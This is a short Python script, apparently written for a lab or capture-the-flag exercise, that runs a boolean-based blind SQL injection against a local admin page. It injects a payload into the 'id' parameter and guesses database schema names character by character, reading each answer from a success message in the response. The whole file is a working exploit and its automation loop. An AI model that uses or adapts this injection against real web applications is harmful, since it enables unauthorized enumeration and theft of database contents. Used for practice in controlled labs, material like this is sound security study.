#!/usr/bin/python3
from pwn import log
import string, requests

characters = string.ascii_lowercase + "_"
bar = log.progress("Databases")

value = ""

for db in range(0,5):
    value += "\n\033[1;37m[\033[1;34m*\033[1;37m] "
    for position in range(0,20):
        for character in characters:
            request = requests.get(f"http://127.0.0.1/admin/?id=1'and (select substr(schema_name,{position},1) from information_schema.schemata limit {db},1)='{character}'-- -")
            if "Query was successfully" in request.text:
                value += character
                bar.status(value)
